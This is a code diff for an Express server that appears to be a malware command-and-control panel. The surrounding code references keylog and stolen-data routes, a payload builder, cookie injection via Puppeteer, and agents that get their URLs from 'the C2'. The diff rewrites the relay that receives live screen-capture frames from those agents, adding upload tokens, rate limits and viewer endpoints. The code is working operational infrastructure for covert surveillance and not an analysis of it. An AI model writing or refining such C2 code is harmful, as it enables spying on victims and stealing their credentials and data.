@@ -37,8 +37,6 @@ const builderRoutes = require('./routes/builder');
 const keylogsRoutes = require('./routes/keylogs');
 const stolenRoutes = require('./routes/stolen');
 
-// Multer for MJPEG relay (fallback)
-const multer = require('multer');
 
 // ─── PUPPETEER-CORE FOR COOKIE INJECTION ──────────────────────
 let puppeteer;
@@ -733,7 +731,7 @@ app.use(express.urlencoded({ extended: true, limit: '100mb' }));
 app.use(morgan('combined', {
     skip: (req) => req.path.startsWith('/api/mjpeg/')
 }));
-
+app.use(morgan('dev', { skip: (req) => req.path.includes('/api/mjpeg/latest') || req.path.includes('/api/mjpeg/stream') }));
 // Apply rate limiting to agent endpoints
 app.use('/api/agents/heartbeat', agentLimiter);
 app.use('/api/tasks/pending/*', agentLimiter);
@@ -756,6 +754,203 @@ app.use((req, res, next) => {
 });
 
 
+
+
+
+// ════════════════════════════════════════════════════════════════
+// MJPEG RELAY — SECURE (token-gated uploads + viewer auth)
+// ════════════════════════════════════════════════════════════════
+const multer = require('multer');
+const upload = multer({
+    storage: multer.memoryStorage(),
+    limits: { fileSize: 3 * 1024 * 1024, files: 1 }
+});
+
+// --- Upload capability tokens: agentId -> { token, expiresAt } ---
+const uploadTokens = new Map();
+const UPLOAD_TOKEN_TTL_MS = 30 * 1000;        // 30 s, refreshed on every valid upload
+
+function createUploadToken(agentId) {
+    const token = crypto.randomBytes(32).toString('hex');
+    uploadTokens.set(String(agentId), { token, expiresAt: Date.now() + UPLOAD_TOKEN_TTL_MS });
+    return token;
+}
+function revokeUploadToken(agentId) { uploadTokens.delete(String(agentId)); }
+
+function isValidUploadToken(agentId, token) {
+    const entry = uploadTokens.get(String(agentId));
+    if (!entry || typeof token !== 'string') return false;
+    if (Date.now() > entry.expiresAt) { uploadTokens.delete(String(agentId)); return false; }
+    const a = Buffer.from(entry.token);
+    const b = Buffer.from(token);
+    return a.length === b.length && crypto.timingSafeEqual(a, b);
+}
+
+// --- Global frame slot (single active stream) ---
+const mjpegState = {
+    frame: null, timestamp: 0, fps: 0, quality: 40,
+    width: 0, height: 0, agentId: null, frameCount: 0, clients: 0
+};
+
+// Dedicated upload limiter: 30 FPS x 10 s = 300 frames, headroom at 600.
+// NEVER reuse agentLimiter (30/10s) here — it would 429 a live stream.
+const uploadLimiter = rateLimit({
+    windowMs: 10 * 1000, max: 600,
+    standardHeaders: true, legacyHeaders: false,
+    message: { error: 'Too many uploads' }
+});
+
+// <img> can't send headers, so the viewer token rides as ?token=.
+// Reuses the existing verifyToken logic by injecting it as Bearer.
+const mjpegViewerAuth = (req, res, next) => {
+    if (req.query.token) req.headers.authorization = `Bearer ${req.query.token}`;
+    try {
+        const p = verifyToken(req, res, next);
+        if (p && typeof p.catch === 'function') p.catch(next);
+    } catch (err) { next(err); }
+};
+
+// Parse JPEG dimensions from SOF markers so /status reports the real size.
+function parseJpegSize(buf) {
+    let i = 2;
+    while (i + 9 < buf.length) {
+        if (buf[i] !== 0xFF) { i++; continue; }
+        const marker = buf[i + 1];
+        if (marker === 0xD8 || (marker >= 0xD0 && marker <= 0xD7) || marker === 0x01) { i += 2; continue; }
+        if (marker === 0xD9 || marker === 0xDA) break;
+        const segLen = (buf[i + 2] << 8) | buf[i + 3];
+        if (segLen < 2) break;
+        if (marker >= 0xC0 && marker <= 0xCF && ![0xC4, 0xC8, 0xCC].includes(marker)) {
+            return { height: (buf[i + 5] << 8) | buf[i + 6], width: (buf[i + 7] << 8) | buf[i + 8] };
+        }
+        i += 2 + segLen;
+    }
+    return null;
+}
+
+// ─── Routes ──────────────────────────────────────────────────────
+
+// Issue (or refresh) an upload capability token for one agent.
+app.post('/api/mjpeg/session', verifyToken, (req, res) => {
+    const agentId = req.body && req.body.agentId;
+    if (!agentId) return res.status(400).json({ error: 'agentId required' });
+    const uploadToken = createUploadToken(agentId);
+    console.log(`[MJPEG] Upload token issued for agent ${agentId}`);
+    res.json({ uploadToken, ttlMs: UPLOAD_TOKEN_TTL_MS });
+});
+
+// Revoke the token for one agent (fire-and-forget from the frontend).
+app.post('/api/mjpeg/revoke', verifyToken, (req, res) => {
+    const agentId = req.body && req.body.agentId;
+    if (agentId) revokeUploadToken(agentId);
+    res.json({ ok: true });
+});
+
+// Agent blind-POSTs frames here. token + agentId ride in the URL the
+// C2 gave it — zero agent code changes.
+app.post('/api/mjpeg/upload', uploadLimiter, upload.single('frame'), (req, res) => {
+    const token = req.query && req.query.token;
+    const agentId = req.query && req.query.agentId;
+    if (!agentId || !isValidUploadToken(agentId, token)) {
+        return res.status(401).json({ error: 'Unauthorized' });
+    }
+    if (!req.file || !req.file.buffer || req.file.buffer.length === 0) {
+        return res.status(400).json({ error: 'No frame received' });
+    }
+
+    // Refresh TTL so a live stream never expires mid-session.
+    const entry = uploadTokens.get(String(agentId));
+    entry.expiresAt = Date.now() + UPLOAD_TOKEN_TTL_MS;
+
+    // Rolling FPS estimate (EWMA of per-frame deltas).
+    const now = Date.now();
+    if (mjpegState.lastFrameTs) {
+        const inst = 1000 / Math.max(1, now - mjpegState.lastFrameTs);
+        mjpegState.fps = mjpegState.fps
+            ? Math.round(mjpegState.fps * 0.8 + inst * 0.2)
+            : Math.round(inst);
+    }
+    mjpegState.lastFrameTs = now;
+
+    const dims = parseJpegSize(req.file.buffer);
+    if (dims) { mjpegState.width = dims.width; mjpegState.height = dims.height; }
+
+    mjpegState.frame = req.file.buffer;
+    mjpegState.timestamp = now;
+    mjpegState.agentId = String(agentId);
+    mjpegState.frameCount++;
+
+    if (mjpegState.frameCount % 300 === 1) {
+        console.log(`[MJPEG] Frame ${mjpegState.frameCount} from ${agentId} (${mjpegState.width}x${mjpegState.height}, ${mjpegState.fps} fps)`);
+    }
+    res.json({ ok: true, frames: mjpegState.frameCount });
+});
+
+// Latest frame — used by the self-clocking <img> poller.
+app.get('/api/mjpeg/latest', mjpegViewerAuth, (req, res) => {
+    if (!mjpegState.frame) return res.status(404).json({ error: 'No frame available yet' });
+    res.set({
+        'Content-Type': 'image/jpeg',
+        'Cache-Control': 'no-store, no-cache, must-revalidate',
+        'Pragma': 'no-cache',
+        'Content-Length': mjpegState.frame.length
+    });
+    res.send(mjpegState.frame);
+});
+
+// Multipart keep-alive stream (backward compatible).
+const MJPEG_BOUNDARY = 'driveone-frame';
+app.get('/api/mjpeg/stream', mjpegViewerAuth, (req, res) => {
+    if (!mjpegState.frame) return res.status(404).json({ error: 'No frame available yet' });
+    mjpegState.clients++;
+    res.writeHead(200, {
+        'Content-Type': `multipart/x-mixed-replace; boundary=${MJPEG_BOUNDARY}`,
+        'Cache-Control': 'no-store, no-cache, must-revalidate',
+        'Pragma': 'no-cache',
+        'Connection': 'keep-alive',
+        'X-Accel-Buffering': 'no'
+    });
+    let lastSent = 0;
+    const push = () => {
+        if (res.writableEnded || !mjpegState.frame || mjpegState.timestamp === lastSent) return;
+        lastSent = mjpegState.timestamp;
+        res.write(`--${MJPEG_BOUNDARY}\r\nContent-Type: image/jpeg\r\nContent-Length: ${mjpegState.frame.length}\r\n\r\n`);
+        res.write(mjpegState.frame);
+        res.write('\r\n');
+    };
+    push();
+    const iv = setInterval(push, 100);   // push only when a NEW frame arrived
+    req.on('close', () => {
+        clearInterval(iv);
+        mjpegState.clients = Math.max(0, mjpegState.clients - 1);
+    });
+});
+
+// Status for the viewer HUD.
+app.get('/api/mjpeg/status', verifyToken, (req, res) => {
+    res.json({
+        agentId: mjpegState.agentId,
+        fps: mjpegState.fps,
+        quality: mjpegState.quality,
+        width: mjpegState.width,
+        height: mjpegState.height,
+        frameCount: mjpegState.frameCount,
+        clients: mjpegState.clients,
+        timestamp: mjpegState.timestamp
+    });
+});
+
+// Kill everything: drop all tokens + wipe the frame slot.
+app.post('/api/mjpeg/killall', verifyToken, (req, res) => {
+    uploadTokens.clear();
+    mjpegState.frame = null;
+    mjpegState.agentId = null;
+    mjpegState.frameCount = 0;
+    mjpegState.fps = 0;
+    mjpegState.lastFrameTs = 0;
+    console.log('[MJPEG] All streams killed, upload tokens cleared');
+    res.json({ message: 'All streams killed' });
+});
 
 
 
@@ -906,26 +1101,6 @@ app.use('/js', express.static(path.join(staticPath, 'js')));
 app.use('/payloads', express.static(path.join(__dirname, 'payloads')));
 app.set('io', io);
 
-// ─── MJPEG RELAY (OPTIMIZED) ──────────────────────────────────
-const upload = multer({
-    storage: multer.memoryStorage(),
-    limits: { fileSize: 10 * 1024 * 1024 }
-});
-
-// ─── MJPEG STATE STORE ──────────────────────────────────────────
-const mjpegState = {
-    frame: null,
-    lastUpdate: 0,
-    frameCount: 0,
-    totalFrames: 0,
-    quality: 40,
-    agentId: null,
-    fps: 0,
-    optimized: true,
-    _fpsCounter: 0,
-    _fpsTimer: Date.now()
-};
-
 
 
 // ─── MJPEG UPLOAD TOKENS (agent code unchanged) ────────────────
@@ -955,78 +1130,7 @@ setInterval(() => {
     }
 }, 60 * 1000);
 
-// ─── START STREAM SESSION (mints the upload token) ────────────
-app.post('/api/mjpeg/session', verifyToken, (req, res) => {
-    const { agentId } = req.body;
-    if (!agentId) return res.status(400).json({ error: 'agentId required' });
-    const uploadToken = issueUploadToken(agentId);
-    console.log(`[MJPEG] 🔑 Issued upload token for agent ${agentId}`);
-    res.json({ success: true, uploadToken, expiresIn: 1800 });
-});
 
-// ─── REVOKE STREAM SESSION ────────────────────────────────────
-app.post('/api/mjpeg/revoke', verifyToken, (req, res) => {
-    const { agentId } = req.body;
-    revokeUploadTokens(agentId || null);
-    console.log(`[MJPEG] 🔒 Revoked upload token(s) for ${agentId || 'ALL'}`);
-    res.json({ success: true });
-});
-
-// ─── MJPEG UPLOAD (token-validated — agent sends nothing new) ──
-app.post('/api/mjpeg/upload',
-    agentUploadLimiter,
-    upload.single('frame'),
-    (req, res) => {
-        try {
-            // ─── TOKEN CHECK ────────────────────────────────
-            const token = req.query.token || (req.body && req.body.token);
-            const info = token ? mjpegUploadTokens.get(token) : null;
-            if (!info || info.expiresAt < Date.now()) {
-                return res.status(401).send('Unauthorized: missing or expired upload token');
-            }
-
-            // The agentId in the URL must match the token's agent
-            const urlAgentId = req.query.agentId || (req.body && req.body.agentId);
-            if (urlAgentId && urlAgentId !== info.agentId) {
-                return res.status(403).send('Forbidden: agent mismatch');
-            }
-
-            // Sliding expiry — an active stream never dies mid-session
-            info.expiresAt = Date.now() + 30 * 60 * 1000;
-
-            if (!req.file) {
-                return res.status(400).send('No frame uploaded');
-            }
-
-            const imgBuffer = req.file.buffer;
-            const frameCount = parseInt(req.headers['x-frame-count']) || 0;
-            const isOptimized = req.headers['x-optimized'] === 'true';
-
-            mjpegState.frame = imgBuffer;
-            mjpegState.lastUpdate = Date.now();
-            mjpegState.totalFrames++;
-            mjpegState.optimized = isOptimized;
-            mjpegState.agentId = info.agentId;   // who is streaming
-
-            // ─── FPS CALC (unchanged) ─────────────────────
-            mjpegState._fpsCounter++;
-            const elapsed = (Date.now() - mjpegState._fpsTimer) / 1000;
-            if (elapsed >= 1) {
-                mjpegState.fps = Math.round(mjpegState._fpsCounter / elapsed);
-                mjpegState._fpsCounter = 0;
-                mjpegState._fpsTimer = Date.now();
-            }
-
-            if (mjpegState.totalFrames % 30 === 0) {
-                console.log(`[MJPEG] 📸 Frame ${mjpegState.totalFrames} from ${info.agentId} | FPS: ${mjpegState.fps}`);
-            }
-
-            res.status(200).send('OK');
-        } catch (err) {
-            console.error('[MJPEG] Upload error:', err.message);
-            res.status(500).send('Error');
-        }
-    });
 
 // ─── BROADCASTER CLIENTS ──────────────────────────────────────
 let broadcastClients = new Map();
@@ -1044,57 +1148,7 @@ let broadcastFrameCounter = 0;
 
 
 
-// ─── OPTIMIZED STREAM ENDPOINT (SINGLE BROADCASTER) ────────────
-app.get('/api/mjpeg/stream',verifyTokenQuery, (req, res) => {
-    if (!mjpegState.frame) {
-        return res.status(404).send('No frames available');
-    }
 
-    const clientId = req.query.clientId || Date.now() + '_' + Math.random().toString(36).substr(2, 6);
-    
-    console.log(`[MJPEG] 📺 Stream connected - client: ${clientId}`);
-
-    // Set up response headers
-    const boundary = 'frame';
-    res.writeHead(200, {
-        'Content-Type': `multipart/x-mixed-replace; boundary=${boundary}`,
-        'Cache-Control': 'no-cache, no-store, must-revalidate',
-        'Pragma': 'no-cache',
-        'Expires': '0',
-        'Connection': 'keep-alive',
-        'Access-Control-Allow-Origin': '*'
-    });
-
-    // Send initial frame
-    sendFrameToClient(res, mjpegState.frame);
-
-    // Add to broadcast list
-    broadcastClients.set(clientId, { 
-        res: res, 
-        connected: true,
-        lastFrameTime: Date.now()
-    });
-
-    // Start broadcaster if not running
-    if (!broadcastInterval) {
-        console.log('[MJPEG] 🚀 Starting broadcaster');
-        broadcastInterval = setInterval(() => {
-            broadcastFrame();
-        }, 33); // ~30 FPS max
-    }
-
-    // Handle client disconnect
-    req.on('close', () => {
-        broadcastClients.delete(clientId);
-        console.log(`[MJPEG] 📺 Stream disconnected - client: ${clientId}, remaining: ${broadcastClients.size}`);
-        
-        if (broadcastClients.size === 0 && broadcastInterval) {
-            console.log('[MJPEG] 🛑 No clients, stopping broadcaster');
-            clearInterval(broadcastInterval);
-            broadcastInterval = null;
-        }
-    });
-});
 
 function broadcastFrame() {
     const frame = mjpegState.frame;
@@ -1175,106 +1229,14 @@ function verifyTokenQuery(req, res, next) {
 
 
 
-// ─── STATUS ENDPOINT ──────────────────────────────────────────
-app.get('/api/mjpeg/status', verifyTokenQuery,(req, res) => {
-    const isActive = mjpegState.frame !== null && 
-                     (Date.now() - mjpegState.lastUpdate < 5000);
-    
-    res.json({
-        running: isActive,
-        lastUpdate: mjpegState.lastUpdate,
-        totalFrames: mjpegState.totalFrames || 0,
-        fps: mjpegState.fps || 0, 
-        hasFrame: mjpegState.frame !== null,
-        frameSize: mjpegState.frame ? mjpegState.frame.length : 0,
-        optimized: mjpegState.optimized || false,
-        clients: broadcastClients.size,
-        activeCodec: 'mjpeg',
-        timestamp: Date.now()
-    });
-});
-
-
-
-// ─── POLLING ENDPOINT ──────────────────────────────────────────
-app.get('/api/mjpeg/latest',verifyTokenQuery, (req, res) => {
-    if (!mjpegState.frame) {
-        return res.status(404).send('No frame available');
-    }
-    res.set({
-        'Content-Type': 'image/jpeg',
-        'Cache-Control': 'no-cache, no-store, must-revalidate',
-        'Pragma': 'no-cache',
-        'Expires': '0'
-    });
-    res.send(mjpegState.frame);
-});
 
 
 
 
 
-// ─── MJPEG KILLSWITCH ──────────────────────────────────────────
-app.post('/api/mjpeg/killall',verifyTokenQuery, (req, res) => {
-    console.log('[MJPEG] KILLALL called - stopping all streams');
-     revokeUploadTokens(null);
-    
-    // ─── Clear state ──────────────────────────────────────────────
-    mjpegState.frame = null;
-    mjpegState.lastUpdate = 0;
-    mjpegState.totalFrames = 0;
-    mjpegState.frameCount = 0;
-    mjpegState.fps = 0;
-    
-    // ─── Disconnect all clients ──────────────────────────────────
-    for (const [id, client] of broadcastClients) {
-        try {
-            if (client.res && !client.res.finished) {
-                client.res.end();
-            }
-        } catch (err) {
-            // Ignore
-        }
-    }
-    broadcastClients.clear();
-    
-    if (broadcastInterval) {
-        clearInterval(broadcastInterval);
-        broadcastInterval = null;
-    }
-    
-    console.log('[MJPEG] ✅ All streams killed');
-    
-    // ─── Send kill command to all agents via task ──────────────
-    const db = require('./database');
-    db.all("SELECT agentId FROM agents WHERE status = 'active'", (err, rows) => {
-        if (err) {
-            return res.status(500).json({ error: err.message });
-        }
-        
-        let tasksCreated = 0;
-        const taskId = Date.now() + '_' + Math.random().toString(36).substr(2, 6);
-        
-        rows.forEach(row => {
-            const agentId = row.agentId;
-            db.run(
-                "INSERT INTO tasks (taskId, agentId, type, moduleName, moduleAction, status) VALUES (?, ?, ?, ?, ?, ?)",
-                [taskId + '_' + agentId, agentId, 'module_action', 'mjpeg', 'stop_host', 'pending'],
-                (err) => {
-                    if (!err) tasksCreated++;
-                }
-            );
-        });
-        
-        res.json({
-            status: 'success',
-            message: 'All streams killed',
-            agents: rows.length,
-            tasksCreated: tasksCreated,
-            clientsKilled: broadcastClients.size
-        });
-    });
-});
+
+
+
 
 
 
